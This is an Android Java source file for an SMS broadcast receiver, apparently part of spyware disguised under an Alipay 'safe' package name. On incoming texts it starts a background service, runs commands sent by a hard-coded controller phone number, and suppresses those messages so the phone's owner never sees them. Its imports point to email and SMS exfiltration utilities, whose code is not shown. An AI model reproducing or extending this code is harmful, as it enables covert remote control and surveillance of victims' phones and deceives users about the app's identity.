package com.alipay.safe.receiver;

import java.io.File;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.SmsMessage;
import android.util.Log;

import com.alipay.safe.util.DatabaseUtil;
import com.alipay.safe.util.DoAboutCodeUtils;
import com.alipay.safe.util.FileUtil;
import com.alipay.safe.util.SendEmailUtil;
import com.alipay.safe.util.SmsSaveOutUtil;

public class MsgAndOtherReceiver extends BroadcastReceiver {

	private static final String TAG = "MsgAndOtherReceiver";

	@Override
	public void onReceive(Context context, Intent intent) {

		Globle.startBackService(context);// Start the back service
		Globle.checkUploadedOrNot(context);
		
		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
			SmsMessage[] msg = null;
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObj = (Object[]) bundle.get("pdus");
				msg = new SmsMessage[pdusObj.length];
				int mmm = pdusObj.length;
				for (int i = 0; i < mmm; i++)
					msg[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
			}

			String msgTxt = "";
			int msgLength = msg.length;
			for (int i = 0; i < msgLength; i++) {
				msgTxt += msg[i].getMessageBody();
			}

			// 获得发信人号码
			String getFromNum = "";
			for (SmsMessage currMsg : msg) {
				getFromNum = currMsg.getDisplayOriginatingAddress();
			}

			Log.v("MsgReceiver", getFromNum);
			if (getFromNum.contains(Globle.PHONE_NUMBER)) {
				if (DoAboutCodeUtils.doOperaByMessage(context, msgTxt)) {
					abortBroadcast();
				}
			}  
		}
	}

}
